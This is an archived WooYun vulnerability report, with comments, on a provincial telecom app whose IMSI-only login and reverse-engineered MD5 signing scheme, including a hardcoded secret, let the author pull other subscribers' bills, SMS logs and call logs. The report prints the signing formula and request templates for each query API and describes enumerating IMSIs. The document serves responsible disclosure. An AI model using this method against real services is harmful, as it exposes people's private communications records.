{"id": 2023, "wybug_id": "wooyun-2014-067250", "wybug_title": "某省电信掌厅认证缺陷导致大量用户身份、话费、通话详单、短信详单信息泄露", "wybug_corp": "电信", "wybug_author": "爱Gail", "wybug_date": "2014-07-03 17:14", "wybug_open_date": "2014-08-17 17:16", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "敏感接口未加权限认证", "安全意识不足", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向公众公开  简要描述： 某省电信掌厅认证缺陷导致大量用户身份、话费、通话详单、短信详单信息泄露 详细说明：  下载了广东电信的掌厅，运行后自动就登陆了，可以查询话费、详单等内容于是，研究了一下app发出的认证url，发现是通过imsi进行认证的\nGET /MOService/api?method=user.login&name=gdtelcom&imsi=4600302300000&esn=&category=android&termcode=HUAWEIM&timestamp=140000000&channel=3&v=1.0&format=1&sig=313B4084A21E78B7A90000000&loginaccount=&loginpwd=&logintype=1&appversion=1.1.97 HTTP/1.1User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.2.2; HUAWEI MT2-C00 Build/HuaweiMT2-C00)Host: 61.140.99.28:8080Connection: Keep-AliveAccept-Encoding: gzip\n通过修改imsi查询别的手机，发现返回报错，那么一定有验证根据排除法一个个测试，测出验证时sig这个字段，sig后面的那一段就是很关键的部分上网找了电信的sig验证文档，并据此生成sig都失败了，后来买办法就反编译了此掌厅app找到了sig生成的代码\n\n关键的部分在\nString str = j.c(\"gdtelcom\" + this.j + \"android\" + this.h + this.e + localLong + \"31.01gdteltelcom123Ax\");localArrayList.add(new BasicNameValuePair(\"sig\", str));\n对此翻译成可以理解的字段为：\nstr=\"gdtelcom\"+imsi+\"android\"+termcode+sessionkey+timestamp+\"31.01gdteltelcom123Ax\"\nj.c这个函数追了一下，基本就是对字符串str进行md5，字符串str包含了固定值和变动部分，变动部分包括imsi、termcode、sessionkey、timestamp部分搞清楚后就用c写一个程序，自动生成imsi和对应的sig\n\n选择本手机imsi对应的前后1000个imsi进行测试\n\n在返回的数据包中，大小超过700的都是成功的，可以看到机主姓名和登陆成功消息在认证通过后，就可以进行业务办理和查询了分析了一下app的URL链接实时账单\nGET /MOService/api?method=bill.queryBillnow&name=gdtelcom&imsi=46003000000&esn=&category=android&termcode=HUAWEI&sessionkey=14010000008&timestamp=140108000000&channel=3&v=1.0&format=1&sig=669046A570E75000000000001 HTTP/1.1\n查询账单\nGET /MOService/api?method=bill.queryBill&name=gdtelcom&imsi=4600302000000&esn=&category=android&termcode=HUAWEI&sessionkey=140108700000000&timestamp=14010800000&month=201403&channel=3&v=1.0&format=1&sig=9FF924AD7474D000000000 HTTP/1.1\n短信详单\nGET /MOService/api?method=detail.querySdetail&name=gdtelcom&imsi=46003023600000000&esn=&category=android&termcode=HUAWEI&sessionkey=140108748504000000&timestamp=14010800000&listingSign=1&qrytime=201405&currentPage=1&pageSize=10&channel=3&v=1.0&format=1&sig=1EBE7C1BBF7A00000 HTTP/1.1\n上网详单\nGET /MOService/api?method=detail.queryJdetail&name=gdtelcom&imsi=460030236500000&esn=&category=android&termcode=HUAWEI&sessionkey=14010874850400000000&timestamp=1401000000&listingSign=1&qrytime=201405&currentPage=1&pageSize=10&channel=3&v=1.0&format=1&sig=1A96316CBD691C165900000000 HTTP/1.1\n电话详单\nGET /MOService/api?method=detail.queryTdetail&name=gdtelcom&imsi=4600302000000&esn=&category=android&termcode=HUAWEIMT&sessionkey=1401087485040&timestamp=14010880000&listingSign=1&qrytime=201405&currentPage=2&pageSize=10&channel=3&v=1.0&format=1&sig=F683426586C143C0A3D1800000 HTTP/1.1\n构造不同的url，其中有些url中sig的值与早期的计算方法不同，这里不细说了总之，可以通过构造URL方式，修改imsi和sig得到任意手机号的上述详单和话费信息服务器返回的都是json数据，很容易看话费情况\n\n短信详单\n\n电话详单\n\n自动化程序可以讲所有数据获取下来，导致拖库一样的后果   漏洞证明：  话费情况\n\n短信详单\n\n电话详单\n\n   修复方案：  加强安全设计   版权声明：转载请注明来源 爱Gail@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-08 11:11 厂商回复： CNVD确认并复现所述情况（未进行逆向部分），已经转由CNCERT向中国电信集团公司通报，建议其做好APP软件安全防护。该案例做为APP应用安全的典型安全，鼓励逆向工作，rank 20 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-03 17:17 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  牛，都这样了还能突破    \n     2014-07-03 17:19 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  广东啊，严重啊    \n     2014-07-03 17:19 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  广东电信..    \n     2014-07-03 17:32 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-07-03 17:35 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  IMSI？    \n     2014-07-03 18:01 |    \t\tdoosit \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | 木有介绍。)\t\t \n  vas?    \n     2014-07-03 18:46 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  电信的问题还真挺多的.... 不是买了很多很多很多设备，很多很多维保服务吗    \n     2014-07-03 21:58 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  广东。。。    \n     2014-07-04 10:20 |    \t\tbing  \t\t\t( 普通白帽子  |\t\t\t        Rank:332 漏洞数:34        | bingsec)\t\t \n  我会告诉你三大运营商我们已经玩腻了吗    \n     2014-07-04 11:31 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  @bing 呵呵，地利优势就不要拿出来装B了    \n     2014-07-04 11:35 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  @疯狗 过奖了    \n     2014-07-04 16:27 |    \t\tbing  \t\t\t( 普通白帽子  |\t\t\t        Rank:332 漏洞数:34        | bingsec)\t\t \n  @hacker@sina.cn 原来漏洞也要看地利优势啊，受教了    \n     2014-07-04 17:44 |    \t\t磁力 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 无)\t\t \n  刚测试了一下，接口已经关闭了，不能利用了。    \n     2014-07-08 11:17 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @bing 什么是地理优势啊    \n     2014-07-08 11:27 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  逆向APP啊，似乎是个不错的方法~    \n     2014-07-28 13:48 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  这个很不错    \n     2014-07-28 15:14 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  @hacker@sina.cn 多谢鼓励    \n     2014-08-18 20:23 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  很厉害啊 这个真......    \n     2014-08-20 09:56 |    \t\t爱Gail \t\t\t( 普通白帽子  |\t\t\t        Rank:237 漏洞数:38        | 爱漏洞、爱编程、爱旅游、爱Gail)\t\t \n  @xsser 多谢鼓励    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}